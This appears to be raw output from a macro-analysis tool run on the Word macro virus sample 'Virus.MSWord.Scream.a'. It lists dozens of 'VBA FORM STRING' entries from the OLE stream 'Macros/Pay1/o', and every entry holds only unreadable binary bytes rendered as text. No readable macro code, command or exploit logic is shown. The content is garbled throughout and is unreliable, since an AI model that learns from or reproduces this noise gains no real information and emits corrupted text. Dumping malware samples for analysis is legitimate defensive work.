-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j���ޞ�H�i_!c�C�{pA�>2�E$�v����Ulnk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<i*Uk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h��ح6��jRo������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*YY�J�P�쬎��o7p8H�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&L6B�3Z�9�8�>�T�\�T~���{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q䡻0��ۨ��=���~�[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FV^�Z)&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N8&��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���.���'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҝ��mL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vp���V&y�9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ا�	\)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H#��C�$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+Rq���"�|ov�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ʞ�w�zG���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=��=lf�Ab����y3V����Ÿ'�O�Z3J(�FSM-G
�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_$����%{�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�`�Ԋ�ᥦ˛Ws
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�i�d:��摂ӻ��]N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yԩ�r_tW�U]i��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h,U���m�e��g4�xm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3����.'�sT�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)Hp��~���gu��ά�l�t�do1�w�;[ګm33���3@.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҭ[v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C|���F����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@<�5*�����Tk�8�?c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� kzyq��+m��w���*��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Qܴ�dA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C]��π�I_c�����״p�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZU)G4�*\?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v���k*j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lҹ�W]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�ǏԢ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�Os��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�"Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��sN�f�IK�*��I0����7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c<|k�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JZ��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yT�=[�F<f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�][K��_h�K��qT0>7��=��?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b��ׇ1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �g���՛a���8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��h�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EJ\G.�oFp}C���iE�v�J�[l��YN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�~�i��.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?��(�Z����&��ѷZ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�35�Ŭ�=�X'�JU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QS7hh`hT���ѧ]�FK2Dڊ뎂�:w>J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�Cy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ů{I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���TKI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zwq��8�p��#P�WM4ā�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O5	UR����p��$��%{B�����)�YN�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��QCs���b�Fr�4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�R]�-��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)��s4����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���RZN'^Wt���}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�8������G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�|P-�ӵ�{v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r���{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�د�6��*hj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
뵽Go��Z�,����� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xD�8]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�����RḩT���в��zd�f����?Z�1�X궤���ʑ|�ٯ_�-�־�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�H�[�:cܿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#H|@�(�H����#H|@�(�H�i�!+k��fZK\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9	�\a}3�e,/ak�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&E���ŅG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VʁOPK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ⴖ��b���Ǘ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�aW�*�G	���P)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�a3WB'gq��]KSDc�l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�LhYY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X���ݘ^�qd�x�Ӑ��h��}e4ԯcd$��`�e��,Q�<���Ŷz�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��9���{�TCP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�Y�;����2�[el5m���o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~���C�I����<3���]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=.��v�<�gB�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TjX�7�@�t�<?��.�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FЗ�����z���SD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<S2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�YX����IP�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x���fR�����V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OkSR��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͍IGBGIs�dM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{�4q�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�.��(K�^%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�7���WP��v\~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����D��'��c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�VS8'���(���<r�a��clu �w��?:jG%�)�,d�"��Q�eҖ��JR��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c֢k)yh�>C���Uq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��[�co/)�+U�h��t��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���a4��9h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!jVV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rrwc�����{*%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�8��,��q�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&&Hvk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�������k�Ǳc�ړ���*D���S�=���N!�oR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T���oR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3ȭԴ�5r�頒W�A��Qb���.t��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]S��!K��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bm������>Cؕ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M�o�2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��B8s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?ԫɂgFޘ9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�ʲ����2s��P�Y_"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�𚀇�)�>�����j�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
܏y��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I5�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܱU���N%�Y.։�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��QL�yI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�.ӻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\rQܨMT/�X�t�><vyB����wұ�m?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�������{U�R�%M�
p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�0KO)�f9�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
򅒰�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Aag)m��]w������K!�Zє
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
